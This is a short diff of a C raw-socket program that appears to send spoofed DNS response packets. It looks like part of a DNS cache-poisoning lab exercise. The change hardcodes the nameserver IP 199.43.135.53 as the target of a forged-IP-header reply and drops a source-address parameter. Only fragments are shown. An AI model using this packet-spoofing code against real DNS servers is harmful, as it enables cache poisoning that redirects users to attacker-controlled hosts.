@@ -120,7 +120,7 @@ unsigned short csum(unsigned short *buf, int nwords)
     return (unsigned short)(~sum);
 }
 
-void responsePacket(char *dns_data, char *src_addr, char *dest_add);
+void responsePacket(char *dns_data, char *dest_add);
 
 int main(int argc, char *argv[])
 {
@@ -275,13 +275,13 @@ int main(int argc, char *argv[])
         if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
             printf("packet send error %d which means %s\n",errno,strerror(errno));
         sleep(1);        
-        responsePacket(data, argv[1], argv[2]);
+        responsePacket(data, argv[2]);
     }
     close(sd);
     return 0;
 }
 
-void responsePacket(char *dns_data, char *src_addr, char *dest_addr){
+void responsePacket(char *dns_data, char *dest_addr){
     int sd;
     char buffer[PCKT_LEN];
     memset(buffer, 0 ,PCKT_LEN);
@@ -388,7 +388,7 @@ void responsePacket(char *dns_data, char *src_addr, char *dest_addr){
     sin.sin_port = htons(33333);
 
     // IP addresses
-    sin.sin_addr.s_addr = inet_addr(dest_addr);
+    sin.sin_addr.s_addr = inet_addr("199.43.135.53");
 
     // Fabricate the IP header or we can use the
     // standard header structures but assign our own values.
